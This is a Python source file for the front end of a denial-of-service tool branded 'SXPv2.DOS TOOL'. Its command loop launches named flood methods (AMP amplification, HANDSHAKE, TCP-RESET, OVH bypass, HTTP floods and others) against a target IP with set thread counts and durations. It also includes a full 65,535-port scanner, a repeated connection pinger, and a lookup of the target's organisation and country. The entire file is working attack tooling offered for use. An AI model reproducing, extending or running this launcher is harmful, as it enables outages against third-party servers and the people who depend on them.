from attrs import menu_lang,custom_lang, clear_console,color_gardient,red_gr
from banner import methods,query
import time,os,threading,json,socket, concurrent.futures,sys,requests

def q(languages,meth):
   a = query(languages['LANG'],meth)
   if a[0] == True:
      return a[1]
   else:return a[0]

def check_port(ip, port, protocol):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if protocol == 'UDP' else socket.SOCK_STREAM)
        s.settimeout(3)
        s.sendto(b'', (ip, port)) if protocol == 'UDP' else s.connect((ip, port))
        return port
    except Exception:
        return None

port_live,port_on,port_keep = 0, 0,[]

def checked_protocol(ip, protocol, many):
    with concurrent.futures.ThreadPoolExecutor(max_workers=many) as executor:
        futures = {executor.submit(check_port, ip, port, protocol): port for port in range(1, 65536)}
        return [future.result() for future in concurrent.futures.as_completed(futures) if future.result()]

def type_sender(meth, args):
    null_output = '> NUL 2>&1' if os.name == 'nt' else '> /dev/null 2>&1'
    os.system(f'python methods/{meth}.py {args} {null_output}')


menu = """               \x1b[38;5;196m╔═╗\x1b[38;5;197m═╗ ╦\x1b[38;5;198m╔═╗\x1b[38;5;40m╔╦╗\x1b[38;5;41m╔═╗\x1b[38;5;42m╔═╗\x1b[38;5;43m╦  \n               \x1b[38;5;196m╚═╗\x1b[38;5;197m╔╩╦╝\x1b[38;5;198m╠═╝ \x1b[38;5;76m║ \x1b[38;5;77m║ ║\x1b[38;5;78m║ ║\x1b[38;5;79m║  \n               \x1b[38;5;196m╚═╝\x1b[38;5;197m╩ ╚═\x1b[38;5;198m╩o  \x1b[38;5;112m╩\x1b[38;5;113m ╚═╝\x1b[38;5;114m╚═╝\x1b[38;5;115m╩═╝\n              \x1b[38;5;196m══╦══════════════════╦══\n    \x1b[38;5;197m╔═══════════╩══════════════════╩═══════════╗╗\n  \x1b[38;5;198m┏┓║         \x1b[38;5;76mWelcome \x1b[38;5;77mTo \x1b[38;5;208mS\x1b[38;5;209mX\x1b[38;5;210mP\x1b[38;5;211mv\x1b[38;5;212m2\x1b[38;5;255m.\x1b[38;5;226mDOS \x1b[38;5;78mTOOL        \x1b[38;5;198m║┏┳┓\n  \x1b[38;5;199m┃┃╚══════════════════════════════════════════╝┃┃┃\n  \x1b[38;5;200m┃┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛┃┃\n\x1b[38;5;201m┏━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻┻┳┓\n\x1b[38;5;200m┃\x1b[38;5;226m%s\x1b[38;5;200m┃┃\n\x1b[38;5;199m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻┛\n     \x1b[38;5;21mCopyright \x1b[38;5;57m© \x1b[38;5;93m%s \x1b[38;5;129mSXPv2 \x1b[38;5;165mAll \x1b[38;5;165mRight's \x1b[38;5;201mReserved\x1b[0m"""
atk = '''\x1b[38;5;196m┏━━━━━━━━━━━━━━━━━━━━┳┓\n\x1b[38;5;196m┃ \x1b[38;5;76m╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \x1b[38;5;196m┃┃\n\x1b[38;5;196m┃ \x1b[38;5;77m╠═╣ ║  ║ ╠═╣║  ╠╩╗ \x1b[38;5;196m┃┃\n\x1b[38;5;196m┃ \x1b[38;5;78m╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \x1b[38;5;196m┃┃\n\x1b[38;5;196m┗━━┳━━━━━━━━━━━━━━━━━┻┛\n\x1b[38;5;196m   ┣━\x1b[38;5;76mS\x1b[38;5;77mT\x1b[38;5;78mA\x1b[38;5;79mT\x1b[38;5;80mU\x1b[38;5;81mS\n\x1b[38;5;197m   ┃  \x1b[38;5;202m└─\x1b[38;5;255m[\x1b[38;5;208m%s\x1b[38;5;255m]\n\x1b[38;5;198m   ┣━━\x1b[38;5;76mA\x1b[38;5;77mT\x1b[38;5;77mT\x1b[38;5;78mA\x1b[38;5;79mC\x1b[38;5;80mK\n\x1b[38;5;199m   ┃   \x1b[38;5;203m├─\x1b[38;5;208mT\x1b[38;5;209mA\x1b[38;5;210mR\x1b[38;5;211mG\x1b[38;5;212mE\x1b[38;5;213mT \x1b[38;5;210m%s\n\x1b[38;5;200m   ┃   \x1b[38;5;209m└─\x1b[38;5;208mM\x1b[38;5;209mE\x1b[38;5;210mT\x1b[38;5;211mH\x1b[38;5;212mO\x1b[38;5;213mD \x1b[38;5;210m%s\n\x1b[38;5;201m   ┣━━\x1b[38;5;76mT\x1b[38;5;77mA\x1b[38;5;78mR\x1b[38;5;79mG\x1b[38;5;80mE\x1b[38;5;81mT\n       \x1b[38;5;207m├─\x1b[38;5;208mO\x1b[38;5;209mR\x1b[38;5;210mG \x1b[38;5;210m%s\n       \x1b[38;5;213m└─\x1b[38;5;208mC\x1b[38;5;209mO\x1b[38;5;210mU\x1b[38;5;211mN\x1b[38;5;212mT\x1b[38;5;213mR\x1b[38;5;219mY \x1b[38;5;210m%s'''

def format_banner(data):return data.replace('\\x1b','\x1b').replace('\\n','\n')
c = 0

def handle_attack_command(com, languages, attack_type,mode,more=''):
    target = ''
    b = q(languages, attack_type)
    if b != False:
        print(b % (com[0]))
    else:
        c = 0
        if more != '':attack_type = more.replace('-','_')
        else:attack_type = attack_type.replace('-','_')
        if mode == 1:
           if len(com) == 6:target,thread,times,meths,p = com[1], com[2], com[3],com[4], com[5]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {thread} {times} {meths} {p} command.txt')).start(); c = 1
        elif mode == 2:
           if len(com) == 5:target,thread,times,meths = com[1], com[2], com[3],com[4]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {thread} {times} {meths}')).start(); c = 1
        elif mode == 5:
           if len(com) == 6:target,port,thread,times,meths = com[1],com[2], com[3], com[4],com[5]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {port} {thread} {times} {meths}')).start(); c = 1
        elif mode == 4:
           if len(com) == 7:target,port,thread,times,booters,meths = com[1],com[2], com[3], com[4],com[5],com[6]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {port} {thread} {times} {booters} {meths}')).start();  c = 1
        elif mode == 3:
           if len(com) == 4:target,thread,meths = com[1], com[2], com[3]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {thread} {meths}')).start(); c = 1
        if c == 0:
           a = format_banner(languages['METHODS'][attack_type.replace('-','').replace('_','')])
           if more != '':a = a.replace(attack_type,F'{more}')
           print(a)
        else:
           country,org = '',''
           try:
              r = json.loads(requests.get(f'https://ipapi.co/{com[1]}/json/').content)
              try:
               country,org = r['country_name'],r['org']
              except Exception as e:country = 'DEFAULT'; org = 'UNKNOWN'
           except:country = 'ERROR'; org = 'KNOW'
           print(atk % (languages['DISPLAY']['ATTACK'], target, com[0],org,country))

def controler():
    global port_live,port_on,port_keep,c,methods,q
    languages = menu_lang()
    print(menu%(languages['DISPLAY']['MAIN'],time.ctime().split( )[4]))
    while True:
     try:
        commander = input("\x1b[38;5;76mS\x1b[38;5;77mX\x1b[38;5;78mP\x1b[38;5;255m.\x1b[38;5;226mT\x1b[38;5;227mO\x1b[38;5;228mO\x1b[38;5;229mL \x1b[38;5;196m--> \x1b[0m")
        com = commander.split(' '); a = com[0].replace('!','').upper()
        if a == 'HELP':print(format_banner(languages['DISPLAY']['HELP']))
        elif a == 'LANGUAGES':
           c = 0
           if len(com) == 2:
              lang = com[1].upper()
              if lang in ['TH','EN', 'AR','VN','IN']:
                 if languages['LANG'] == lang:print('\x1b[38;5;196m Same Languages\x1b[0m')
                 else:languages = custom_lang(lang); c = 1
              else:print(f'\x1b[38;5;196m Wrong Languages ( TH, VN, AR, EN, IN ) !\x1b[0m')
           else:languages = menu_lang(); c = 1
           if c == 1:print(menu%(languages['DISPLAY']['MAIN'],time.ctime().split( )[4]))
        elif a == 'CLS':clear_console()
        elif a in ['METH','ATTACKS','ATK','HUB','METHOD','METHODS']:print(methods())
        elif a in ['BROWSER','المتصفح','เบราว์เซอร์'] or a.encode() == b'TR\xc3\x8cNHDUY\xe1\xbb\x86T':handle_attack_command(com, languages, 'BROWSER',1)
        elif a in ['HANDSHAKE','المصافحة','เชื่อมต่อ'] or a.encode() in [b'B\xe1\xba\xaeTTAY',b'B\xe1\xba\xaeTTAY2']:handle_attack_command(com, languages, 'HANDSHAKE',2)
        elif a in ['HANDSHAKE2','المصافحة2','เชื่อมต่อ2'] or a.encode() == b'B\xe1\xba\xaeTTAY2':handle_attack_command(com, languages, 'HANDSHAKE',2,'HANDSHAKE2')
        elif a == 'RAPID-FAST':handle_attack_command(com, languages, 'MURD',3,'RAPID-FAST')
        elif a in ['AMP','أمب','ขยาย']:handle_attack_command(com, languages, 'AMP',2)
        elif a == 'MURD':handle_attack_command(com, languages, 'MURD',3)
        elif a in ['MURD-OPT','MURD_OPT','MURDOPT']:handle_attack_command(com, languages, 'MURD',3,'MURD-OPT')
        elif a in ['OVH_RPS','OVH-RPS','أوفه-آربيس','OVHRPS']:
           if len(com) != 1 and len(com) != 7:com.append('GET')
           handle_attack_command(com, languages, 'OVH-RPS',4)
        elif a in ['OVH-CONNECT','OVH-الاتصال','OVH_CONNECT','OVHCONNECT']:
            if len(com) != 1 and len(com) != 7:com.append('GET')
            handle_attack_command(com, languages, 'OVH-CONNECT',4)
        elif a in ['HTTPQUERY','HTTP_QUERY','HTTP-QUERY']:handle_attack_command(com, languages, 'HTTP-QUERY',4)
        elif a in ['HTTP_19','HTTP-19']:handle_attack_command(com, languages, 'HTTP-19',5)
        elif a in ['TCP-RESET','TCPRESET','TCP_RESET']:handle_attack_command(com, languages, 'TCP-RESET',2)
        elif a == 'PAPING':
           if len(com) == 5:
              ip = com[1]
              port = int(com[2])
              protocol = com[3]
              timeouts = int(com[4])
              while True:
                 try:
                    if protocol == 'TCP':
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeouts); s.connect((ip, port)); s.connect_ex((ip, port)); start_time = time.time(); s.send(b''); s.sendall(b''); end_time = time.time(); response_time_ms = (end_time - start_time) * 1000
                    else:
                     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(timeouts); start_time = time.time(); s.sendto(b'',((ip,port))); end_time = time.time(); response_time_ms = (end_time - start_time) * 1000
                    print(format_banner(languages['PING']['OK']%(ip,response_time_ms,protocol,port)))
                 except KeyboardInterrupt:break
                 except:c = 1; print(format_banner(languages['PING']['NO']%(ip,port)))
           else:
              print('\x1b[38;5;112mPAPING \x1b[38;5;76m<\x1b[38;5;78mIP OR HOSTNAME\x1b[38;5;76m> \x1b[38;5;76m<\x1b[38;5;106mPORT\x1b[38;5;76m> \x1b[38;5;76m<\x1b[38;5;196mTCP OR UDP only\x1b[38;5;76m> \x1b[38;5;76m<\x1b[38;5;78mtimeout\x1b[38;5;76m>\x1b[0m')
        elif a == 'SCAN':
           if len(com) == 4:
              ip = com[1]; protocol = com[2]; many = int(com[3])
              port_live = 0; port_on = 0; port_keep.clear()
              t = threading.Thread(target=checked_protocol,args=(ip, protocol, many)); t.start()
              while True:
                 if port_live > 65535 or port_live == 65535:break
                 else:
                    sys.stdout.write(f"\r\x1b[0;m{format_banner(languages['PING']['OPEN']%(port_keep))} \x1b[38;5;51mNOW\x1b[38;5;225m=\x1b[38;5;196m{port_live}\x1b[38;5;225m/\x1b[38;5;76m{port_on}\x1b[0m\033[K"); sys.stdout.flush()
              print('\rDONE\033[K\n')
              t.join()
           else:print('\x1b[38;5;55mSCAN \x1b[38;5;55m<\x1b[38;5;76mip or hostname\x1b[38;5;55m> \x1b[38;5;55m<\x1b[38;5;76mUDP OR TCP only\x1b[38;5;55m> \x1b[38;5;55m<\x1b[38;5;76mthread\x1b[38;5;55m>\n\n  \x1b[38;5;55m<\x1b[38;5;76mthread\x1b[38;5;55m> \x1b[38;5;255mmax it idk but less it better for scan but it slow too.\n\n\x1b[38;5;226mExample\n \x1b[38;5;196mSCAN \x1b[38;5;76m1.1.1.1 \x1b[38;5;77mTCP \x1b[38;5;78m2000\x1b[0m')
        elif a == 'MENU':clear_console(); print(menu%(languages['DISPLAY']['MAIN'],time.ctime().split( )[4]))
        elif a == 'EXIT':exit()
        else:print(color_gardient(f'Not Found COMMAND --> {a}',red_gr,opt=0))
     except KeyboardInterrupt:
        if c == 0:exit()
        else:c = 0
